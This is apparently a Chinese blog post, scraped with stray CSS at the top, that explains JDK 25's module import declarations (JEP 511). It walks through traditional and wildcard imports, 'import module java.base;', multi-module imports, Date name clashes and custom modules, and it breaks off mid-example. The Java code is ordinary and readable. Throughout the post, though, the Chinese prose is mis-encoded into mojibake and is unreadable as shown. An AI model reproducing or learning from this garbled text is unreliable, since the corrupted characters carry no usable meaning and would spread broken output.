a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><p>ä¸çŸ¥é“å¤§å®¶ç¬¬ä¸€æ¬¡å†™Javaç¨‹åºæ—¶ï¼Œæ˜¯å¦æœ‰è¿‡è¿™æ ·çš„å›°æƒ‘ï¼Ÿä¸ºä»€ä¹ˆ<code>String</code>ä¸ç”¨å¯¼å…¥å°±èƒ½ç›´æ¥ç”¨ï¼Œä½†<code>List</code>å°±å¿…é¡»å†™<code>import java.util.List;</code>ï¼Ÿç”¨æ˜Ÿå·<code>*</code>å¯¼å…¥æŸä¸ªåŒ…ä¸‹æ‰€æœ‰ç±»ï¼ˆæ¯”å¦‚<code>import java.util.*;</code>ï¼‰ä¼šä¸ä¼šæœ‰æ€§èƒ½æŸè€—ï¼Ÿ<code>Stream</code>ç±»åˆ°åº•åœ¨<code>java.util.stream</code>è¿˜æ˜¯<code>java.util.function</code>åŒ…ä¸‹ï¼Ÿ</p>
<p>è¿™äº›çœ‹ä¼¼åŸºç¡€çš„å¯¼å…¥é—®é¢˜ï¼Œä¸ä»…å›°æ‰°ç€Javaæ–°æ‰‹ï¼Œè¿ä¸å°‘èµ„æ·±å¼€å‘è€…åœ¨åˆ‡æ¢åœºæ™¯æ—¶ä¹Ÿä¼šé¢‘é¢‘å¡é¡¿ã€‚æ›´æœ‰ç½‘å‹ç›´è¨€ç¾¡æ…•Pythonä¸­â€œå¼€ç®±å³ç”¨â€çš„æ¨¡å—æœºåˆ¶â€”â€”ä¸ç”¨åœ¨ä»£ç å¤´éƒ¨å †ç Œå¤§é‡å¯¼å…¥è¯­å¥ï¼Œå°±èƒ½ç›´æ¥ä½¿ç”¨æ ¸å¿ƒåŠŸèƒ½ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªç—›ç‚¹ï¼ŒJEP 511ï¼ˆModule Import Declarationsï¼‰ææ¡ˆåº”è¿è€Œç”Ÿï¼Œå¹¶åœ¨JDK 25ä¸­æ­£å¼è½åœ°ã€‚è¿™ä¸ªç‰¹æ€§è®©Javaæ‹¥æœ‰äº†çœŸæ­£çš„æ¨¡å—çº§å¯¼å…¥èƒ½åŠ›ï¼Œåªéœ€ä¸€è¡Œ<code>import module java.base;</code>ï¼Œå°±èƒ½ç›´æ¥ä½¿ç”¨54ä¸ªæ ¸å¿ƒåŒ…ä¸­çš„æ•°åƒä¸ªç±»ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a4b46c159f43d28e97b3d08e8958e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54u854i3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765789538&amp;x-signature=8%2F3MG1J%2FXsnomFmObxJ60en8PAw%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€å…ˆææ‡‚ï¼šJavaå¯¼å…¥æœºåˆ¶çš„â€œå‰ä¸–ä»Šç”Ÿâ€</h2>
<p>åœ¨èŠJDK 25çš„æ–°ç‰¹æ€§å‰ï¼Œæˆ‘ä»¬å¾—å…ˆå¼„æ˜ç™½ï¼šJavaçš„å¯¼å…¥æœºåˆ¶ä¸ºä»€ä¹ˆä¼šè®©äººâ€œå¤´ç–¼â€ï¼Ÿè¿™ä¸€åˆ‡è¦ä»Javaçš„åŒ…ç»“æ„è®¾è®¡è¯´èµ·ã€‚</p>
<h3 data-id="heading-1">1.1 ä¼ ç»Ÿå¯¼å…¥çš„ä¸¤ç§æ–¹å¼ä¸ç—›ç‚¹</h3>
<p>Javaä¼ ç»Ÿçš„å¯¼å…¥æ–¹å¼åˆ†ä¸ºâ€œç²¾ç¡®å¯¼å…¥â€å’Œâ€œé€šé…ç¬¦å¯¼å…¥â€ä¸¤ç§ï¼ŒäºŒè€…å„æœ‰å±€é™ï¼š</p>
<ul>
<li>
<p><strong>ç²¾ç¡®å¯¼å…¥</strong>ï¼šæ¯”å¦‚<code>import java.util.List;</code>ï¼Œä»…å¯¼å…¥æŒ‡å®šç±»ã€‚ä¼˜ç‚¹æ˜¯æ˜ç¡®æ¸…æ™°ï¼ŒIDEèƒ½ç²¾å‡†æç¤ºï¼›ç¼ºç‚¹æ˜¯å½“éœ€è¦ä½¿ç”¨å¤šä¸ªåŒ…çš„ç±»æ—¶ï¼Œä»£ç å¤´éƒ¨ä¼šè¢«å¤§é‡å¯¼å…¥è¯­å¥å æ®ï¼Œæ˜¾å¾—è‡ƒè‚¿ã€‚</p>
</li>
<li>
<p><strong>é€šé…ç¬¦å¯¼å…¥</strong>ï¼šæ¯”å¦‚<code>import java.util.*;</code>ï¼Œå¯¼å…¥æŒ‡å®šåŒ…ä¸‹æ‰€æœ‰ç±»ã€‚ä¼˜ç‚¹æ˜¯å‡å°‘å¯¼å…¥è¯­å¥æ•°é‡ï¼›ä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾â€”â€”æ— æ³•ç›´è§‚çŸ¥é“ä½¿ç”¨äº†å“ªäº›ç±»ï¼Œå¤šä¸ªåŒ…å­˜åœ¨åŒåç±»æ—¶ä¼šå‡ºç°å†²çªï¼ˆæ¯”å¦‚<code>java.util.Date</code>å’Œ<code>java.sql.Date</code>ï¼‰ï¼Œè¿˜ä¼šè®©æ–°æ‰‹è¯¯ä»¥ä¸ºâ€œæ˜Ÿå·ä¼šå¯¼å…¥å­åŒ…çš„ç±»â€ï¼ˆå®é™…ä¸ä¼šï¼Œæ¯”å¦‚<code>java.util.*</code>ä¸ä¼šå¯¼å…¥<code>java.util.stream</code>ä¸‹çš„ç±»ï¼‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-2">1.2 ä¸ºä»€ä¹ˆStringä¸ç”¨å¯¼å…¥ï¼Ÿ</h3>
<p>å›åˆ°å¼€å¤´çš„é—®é¢˜ï¼š<code>String</code>å±äº<code>java.lang</code>åŒ…ï¼Œè€ŒJavaç¼–è¯‘å™¨ä¼šé»˜è®¤å¯¼å…¥<code>java.lang.*</code>ï¼Œæ‰€ä»¥ä¸éœ€è¦æ‰‹åŠ¨å¯¼å…¥ã€‚ä½†åƒ<code>List</code>ï¼ˆ<code>java.util</code>åŒ…ï¼‰ã€<code>HashMap</code>ï¼ˆ<code>java.util</code>åŒ…ï¼‰è¿™äº›ä¸å±äº<code>java.lang</code>çš„ç±»ï¼Œå°±å¿…é¡»æ‰‹åŠ¨å¯¼å…¥ã€‚</p>
<p>è¿™ä¸ªâ€œé»˜è®¤å¯¼å…¥â€çš„è®¾è®¡ï¼Œæœ¬è´¨æ˜¯ä¸ºäº†ç®€åŒ–æ ¸å¿ƒç±»çš„ä½¿ç”¨ï¼Œä½†ä¹Ÿè®©ä¸å°‘æ–°æ‰‹å¯¹â€œå¯¼å…¥è§„åˆ™â€äº§ç”Ÿäº†è®¤çŸ¥åå·®ã€‚</p>
<h3 data-id="heading-3">1.3 é€šé…ç¬¦å¯¼å…¥çš„æ€§èƒ½è°£è¨€ï¼Ÿ</h3>
<p>å¾ˆå¤šäººæ‹…å¿ƒâ€œç”¨æ˜Ÿå·å¯¼å…¥ä¼šå½±å“ç¨‹åºæ€§èƒ½â€ï¼Œå…¶å®è¿™æ˜¯ä¸ªè°£è¨€ã€‚Javaçš„å¯¼å…¥æœºåˆ¶ä»…ä½œç”¨äºç¼–è¯‘æœŸâ€”â€”ç¼–è¯‘å™¨ä¼šæ ¹æ®å¯¼å…¥è¯­å¥æ‰¾åˆ°å¯¹åº”çš„ç±»å¹¶ç”Ÿæˆå…¨é™å®šåï¼Œæœ€ç»ˆçš„å­—èŠ‚ç ä¸­ä½¿ç”¨çš„éƒ½æ˜¯ç±»çš„å…¨é™å®šåï¼ˆæ¯”å¦‚<code>java.util.List</code>ï¼‰ï¼Œä¸å¯¼å…¥æ–¹å¼æ— å…³ã€‚æ— è®ºæ˜¯ç²¾ç¡®å¯¼å…¥è¿˜æ˜¯é€šé…ç¬¦å¯¼å…¥ï¼Œç”Ÿæˆçš„å­—èŠ‚ç å’Œè¿è¡Œæ—¶æ€§èƒ½å®Œå…¨ä¸€è‡´ã€‚</p>
<p>é€šé…ç¬¦å¯¼å…¥çš„çœŸæ­£é—®é¢˜æ˜¯â€œä»£ç å¯è¯»æ€§å’Œç»´æŠ¤æ€§â€ï¼Œè€Œéæ€§èƒ½ã€‚</p>
<h2 data-id="heading-4">äºŒã€JDK 25æ•‘åœºï¼šæ¨¡å—çº§å¯¼å…¥æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>JEP 511æå‡ºçš„â€œæ¨¡å—çº§å¯¼å…¥â€ï¼Œæ ¸å¿ƒæ˜¯æ‰“ç ´ä¼ ç»Ÿâ€œåŒ…çº§å¯¼å…¥â€çš„é™åˆ¶ï¼Œç›´æ¥åŸºäºJava 9å¼•å…¥çš„â€œæ¨¡å—ç³»ç»Ÿâ€è¿›è¡Œå¯¼å…¥ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡å¯¼å…¥ä¸€ä¸ªæ¨¡å—ï¼Œç›´æ¥ä½¿ç”¨è¯¥æ¨¡å—ä¸‹æ‰€æœ‰å¯¼å‡ºåŒ…çš„ç±»ã€‚</p>
<h3 data-id="heading-5">2.1 æ ¸å¿ƒåŸç†ï¼šæ¨¡å—ä¸å¯¼å‡ºåŒ…</h3>
<p>Java 9åŠä»¥åçš„JDKè¢«æ‹†åˆ†ä¸ºå¤šä¸ªæ¨¡å—ï¼ˆæ¯”å¦‚<code>java.base</code>ã€<code>java.sql</code>ã€<code>java.xml</code>ç­‰ï¼‰ï¼Œæ¯ä¸ªæ¨¡å—ä¼šåœ¨<code>module-info.java</code>ä¸­å£°æ˜â€œå¯¼å‡ºçš„åŒ…â€ï¼ˆç”¨<code>exports</code>å…³é”®å­—ï¼‰ã€‚å…¶ä»–æ¨¡å—åªèƒ½ä½¿ç”¨è¢«å¯¼å‡ºçš„åŒ…ä¸­çš„ç±»ã€‚</p>
<p>ä»¥æœ€æ ¸å¿ƒçš„<code>java.base</code>æ¨¡å—ä¸ºä¾‹ï¼Œå®ƒå¯¼å‡ºäº†<code>java.lang</code>ã€<code>java.util</code>ã€<code>java.io</code>ã€<code>java.math</code>ç­‰54ä¸ªåŸºç¡€åŒ…â€”â€”è¿™äº›åŒ…åŸºæœ¬æ¶µç›–äº†Javaå¼€å‘çš„æ—¥å¸¸éœ€æ±‚ã€‚JDK 25çš„æ¨¡å—çº§å¯¼å…¥ï¼Œå°±æ˜¯ç›´æ¥å¯¼å…¥æ•´ä¸ªæ¨¡å—ï¼Œä»è€Œè·å¾—è¯¥æ¨¡å—ä¸‹æ‰€æœ‰å¯¼å‡ºåŒ…çš„ä½¿ç”¨æƒé™ã€‚</p>
<h3 data-id="heading-6">2.2 è¯­æ³•ï¼šä¸€è¡Œä»£ç æå®šæ ¸å¿ƒå¯¼å…¥</h3>
<p>æ¨¡å—çº§å¯¼å…¥çš„è¯­æ³•éå¸¸ç®€æ´ï¼Œæ ¼å¼ä¸ºï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> æ¨¡å—å;
</code></pre>
<p>æ¯”å¦‚å¯¼å…¥æ ¸å¿ƒçš„<code>java.base</code>æ¨¡å—ï¼Œåªéœ€ä¸€è¡Œï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> java.base;
</code></pre>
<p>è¿™ä¸€è¡Œä»£ç çš„æ•ˆæœï¼Œç›¸å½“äºå¯¼å…¥äº†<code>java.base</code>æ¨¡å—ä¸‹æ‰€æœ‰54ä¸ªå¯¼å‡ºåŒ…çš„ç±»â€”â€”æ— è®ºæ˜¯<code>java.lang.String</code>ã€<code>java.util.List</code>ï¼Œè¿˜æ˜¯<code>java.io.File</code>ã€<code>java.util.stream.Stream</code>ï¼Œéƒ½èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ— éœ€å†å†™å•ç‹¬çš„åŒ…çº§å¯¼å…¥è¯­å¥ã€‚</p>
<h3 data-id="heading-7">2.3 ä¸ä¼ ç»Ÿå¯¼å…¥çš„å¯¹æ¯”ï¼šä»£ç ç¬é—´â€œç˜¦èº«â€</h3>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ªç®€å•çš„æ¡ˆä¾‹å¯¹æ¯”ä¼ ç»Ÿå¯¼å…¥å’Œæ¨¡å—çº§å¯¼å…¥çš„å·®å¼‚ã€‚å‡è®¾è¦å†™ä¸€ä¸ªç¨‹åºï¼Œå®ç°â€œè¯»å–æ–‡ä»¶å†…å®¹å¹¶æŒ‰è¡Œæ’åºâ€ï¼Œä¼ ç»Ÿå†™æ³•çš„å¯¼å…¥è¯­å¥ä¼šéå¸¸å¤šï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-comment">// ä¼ ç»Ÿå¯¼å…¥ï¼šéœ€è¦é€ä¸ªå¯¼å…¥ç”¨åˆ°çš„åŒ…</span>
<span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.FileReader;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.Collections;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.stream.Collectors;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileSortDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        List&lt;String&gt; lines = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"test.txt"</span>))) {
            String line;
            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) {
                lines.add(line);
            }
        }
        <span class="hljs-comment">// ä½¿ç”¨Streamæ’åº</span>
        List&lt;String&gt; sortedLines = lines.stream()
                .sorted()
                .collect(Collectors.toList());
        System.out.println(sortedLines);
    }
}
</code></pre>
<p>è€Œä½¿ç”¨JDK 25çš„æ¨¡å—çº§å¯¼å…¥åï¼Œä»£ç ä¼šå˜å¾—å¼‚å¸¸ç®€æ´ï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-comment">// æ¨¡å—çº§å¯¼å…¥ï¼šä¸€è¡Œæå®šæ‰€æœ‰æ ¸å¿ƒåŒ…</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> java.base;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileSortDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException {
        List&lt;String&gt; lines = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"test.txt"</span>))) {
            String line;
            <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) {
                lines.add(line);
            }
        }
        List&lt;String&gt; sortedLines = lines.stream()
                .sorted()
                .collect(Collectors.toList());
        System.out.println(sortedLines);
    }
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¯¼å…¥è¯­å¥ä»6è¡Œç¼©å‡ä¸º1è¡Œï¼Œä»£ç å¯è¯»æ€§å¤§å¹…æå‡ï¼ŒåŒæ—¶é¿å…äº†æ¼å¯¼åŒ…çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-8">ä¸‰ã€è¿›é˜¶ä½¿ç”¨ï¼šæ¨¡å—çº§å¯¼å…¥çš„åœºæ™¯ä¸æŠ€å·§</h2>
<p>æ¨¡å—çº§å¯¼å…¥å¹¶éâ€œä¸‡èƒ½â€ï¼Œå®ƒæœ‰ç‰¹å®šçš„ä½¿ç”¨åœºæ™¯å’Œæ³¨æ„äº‹é¡¹ã€‚åˆç†ä½¿ç”¨æ‰èƒ½å‘æŒ¥å…¶æœ€å¤§ä»·å€¼ã€‚</p>
<h3 data-id="heading-9">3.1 æ ¸å¿ƒä½¿ç”¨åœºæ™¯</h3>
<ul>
<li>
<p><strong>å¿«é€Ÿå¼€å‘ä¸åŸå‹éªŒè¯</strong>ï¼šåœ¨å†™Demoã€å·¥å…·ç±»æˆ–åŸå‹ä»£ç æ—¶ï¼Œä¸éœ€è¦å…³æ³¨å…·ä½“çš„åŒ…ç»“æ„ï¼Œä¸€è¡Œæ¨¡å—å¯¼å…¥å°±èƒ½å¿«é€Ÿä¸Šæ‰‹ï¼Œæå‡å¼€å‘æ•ˆç‡ã€‚</p>
</li>
<li>
<p><strong>æ–°æ‰‹å…¥é—¨</strong>ï¼šå‡å°‘æ–°æ‰‹å¯¹â€œåŒ…å’Œå¯¼å…¥â€çš„è®¤çŸ¥è´Ÿæ‹…ï¼Œè®©ä»–ä»¬æ›´ä¸“æ³¨äºæ ¸å¿ƒè¯­æ³•é€»è¾‘ï¼Œè€Œéçº ç»“â€œç±»åœ¨å“ªä¸ªåŒ…ä¸‹â€ã€‚</p>
</li>
<li>
<p><strong>é€šç”¨ä¸šåŠ¡å¼€å‘</strong>ï¼šæ—¥å¸¸å¼€å‘ä¸­ï¼Œ<code>java.base</code>æ¨¡å—çš„54ä¸ªåŒ…åŸºæœ¬èƒ½è¦†ç›–80%ä»¥ä¸Šçš„éœ€æ±‚ï¼Œæ¨¡å—çº§å¯¼å…¥è¶³ä»¥æ»¡è¶³å¼€å‘éœ€æ±‚ã€‚</p>
</li>
</ul>
<h3 data-id="heading-10">3.2 å¤šæ¨¡å—å¯¼å…¥ï¼šæŒ‰éœ€ç»„åˆ</h3>
<p>å¦‚æœéœ€è¦ä½¿ç”¨<code>java.base</code>ä¹‹å¤–çš„æ¨¡å—ï¼ˆæ¯”å¦‚æ•°æ®åº“ç›¸å…³çš„<code>java.sql</code>æ¨¡å—ï¼‰ï¼Œåªéœ€è¿½åŠ æ¨¡å—å¯¼å…¥è¯­å¥å³å¯ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-comment">// å¯¼å…¥æ ¸å¿ƒæ¨¡å—å’Œæ•°æ®åº“æ¨¡å—</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> java.base;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> java.sql;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// ä½¿ç”¨java.sqlåŒ…ä¸‹çš„ç±»ï¼Œæ— éœ€å•ç‹¬å¯¼å…¥</span>
        Class.forName(<span class="hljs-string">"com.mysql.cj.jdbc.Driver"</span>);
        <span class="hljs-keyword">try</span> (java.sql.<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> java.sql.DriverManager.getConnection(
                <span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>, <span class="hljs-string">"root"</span>, <span class="hljs-string">"password"</span>)) {
            java.sql.<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();
            java.sql.<span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(<span class="hljs-string">"SELECT * FROM user"</span>);
            <span class="hljs-keyword">while</span> (rs.next()) {
                System.out.println(rs.getString(<span class="hljs-string">"username"</span>));
            }
        }
    }
}
</code></pre>
<p>è¿™é‡Œå¯¼å…¥äº†<code>java.sql</code>æ¨¡å—åï¼Œ<code>Connection</code>ã€<code>Statement</code>ç­‰ç±»éƒ½èƒ½ç›´æ¥ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-11">3.3 è§£å†³ç±»åå†²çªï¼šæ¨¡å—çº§å¯¼å…¥çš„ä¼˜å…ˆçº§</h3>
<p>å½“å¤šä¸ªæ¨¡å—çš„å¯¼å‡ºåŒ…ä¸­å­˜åœ¨åŒåç±»æ—¶ï¼Œæ¨¡å—çº§å¯¼å…¥ä¼šå¦‚ä½•å¤„ç†ï¼Ÿç­”æ¡ˆæ˜¯â€œç²¾ç¡®å¯¼å…¥ä¼˜å…ˆäºæ¨¡å—çº§å¯¼å…¥â€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç²¾ç¡®å¯¼å…¥æ¥æŒ‡å®šä½¿ç”¨å“ªä¸ªç±»ã€‚</p>
<p>ä¾‹å¦‚ï¼Œ<code>java.util.Date</code>å’Œ<code>java.sql.Date</code>æ˜¯ä¸¤ä¸ªåŒåç±»ï¼Œéƒ½åˆ†åˆ«åœ¨<code>java.base</code>å’Œ<code>java.sql</code>æ¨¡å—ä¸­ã€‚å¦‚æœåŒæ—¶å¯¼å…¥è¿™ä¸¤ä¸ªæ¨¡å—ï¼Œç›´æ¥ä½¿ç”¨<code>Date</code>ä¼šæŠ¥é”™ï¼Œæ­¤æ—¶åªéœ€æ·»åŠ ç²¾ç¡®å¯¼å…¥å³å¯è§£å†³ï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> java.base;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> java.sql;
<span class="hljs-comment">// ç²¾ç¡®å¯¼å…¥æŒ‡å®šä½¿ç”¨java.util.Date</span>
<span class="hljs-keyword">import</span> java.util.Date;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DateDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Date</span> <span class="hljs-variable">utilDate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">// æ­£å¸¸ä½¿ç”¨java.util.Date</span>
        java.sql.<span class="hljs-type">Date</span> <span class="hljs-variable">sqlDate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.sql.Date(System.currentTimeMillis()); <span class="hljs-comment">// ç”¨å…¨é™å®šååŒºåˆ†</span>
    }
}
</code></pre>
<p>è¿™ç§â€œæ¨¡å—çº§å¯¼å…¥+ç²¾ç¡®å¯¼å…¥â€çš„ç»„åˆæ–¹å¼ï¼Œæ—¢ä¿ç•™äº†æ¨¡å—å¯¼å…¥çš„ç®€æ´æ€§ï¼Œåˆè§£å†³äº†ç±»åå†²çªé—®é¢˜ã€‚</p>
<h3 data-id="heading-12">3.4 è‡ªå®šä¹‰æ¨¡å—çš„å¯¼å…¥ï¼šéJDKæ¨¡å—ä¹Ÿèƒ½ç”¨</h3>
<p>æ¨¡å—çº§å¯¼å…¥ä¸ä»…é€‚ç”¨äºJDKè‡ªå¸¦çš„æ¨¡å—ï¼Œä¹Ÿé€‚ç”¨äºæˆ‘ä»¬è‡ªå®šä¹‰çš„æ¨¡å—ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè‡ªå®šä¹‰æ¨¡å—<code>com.example.utils</code>ï¼Œå…¶<code>module-info.java</code>å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-keyword">module</span> com.example.utils {
    <span class="hljs-comment">// å¯¼å‡ºå·¥å…·åŒ…</span>
    <span class="hljs-keyword">exports</span> com.example.utils.string;
    <span class="hljs-keyword">exports</span> com.example.utils.collection;
}
</code></pre>
<p>åœ¨å¦ä¸€ä¸ªæ¨¡å—ä¸­ï¼Œè¦ä½¿ç”¨è¿™ä¸ªè‡ªå®šä¹‰æ¨¡å—çš„ç±»ï¼Œåªéœ€å¯¼å…¥è¯¥æ¨¡å—å³å¯ï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-comment">// å¯¼å…¥è‡ªå®šä¹‰æ¨¡å—</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span> com.example.utils;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomModuleDemo</span> {
